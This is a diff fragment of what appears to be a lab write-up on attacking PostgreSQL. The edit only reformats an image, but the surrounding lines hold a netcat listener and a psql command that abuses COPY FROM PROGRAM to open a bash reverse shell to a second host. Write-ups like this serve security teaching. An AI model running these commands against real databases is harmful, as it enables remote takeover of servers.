@@ -64,7 +64,9 @@ apt-get update && apt install tmux -y
 tmux new -d -s netcat-listener 'nc -lvvp 4444'
 tmux new -d -s start-shell "psql postgresql://user:SecretPostgreSQLPassword@172.19.0.2:5432/mydatabase -c \\"CREATE TABLE rev_shell (data text); COPY rev_shell FROM program '/bin/bash -c \\\\\\"bash -i >& /dev/tcp/172.19.0.3/4444 0>&1\\\\\\"';\\""
 tmux attach -t netcat-listeners
-```![Successful reverse shell and conveniently we have root](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cn4MU51zFPc-_eI1AUQTNQ.png)
+```
+
+![Successful reverse shell and conveniently we have root](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cn4MU51zFPc-_eI1AUQTNQ.png)
 
 “One often meets his destiny on the road he takes to avoid it.” - Master Oogway
 -------------------------------------------------------------------------------
